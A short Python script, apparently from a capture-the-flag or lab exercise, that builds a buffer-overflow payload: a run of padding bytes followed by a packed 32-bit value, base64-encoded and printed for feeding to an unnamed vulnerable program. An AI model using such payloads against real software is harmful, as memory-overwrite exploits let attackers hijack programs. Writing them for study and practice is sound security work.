
import sys
import struct
import base64

buf = b'ttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt'
buf += struct.pack('<I', 2060389597)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
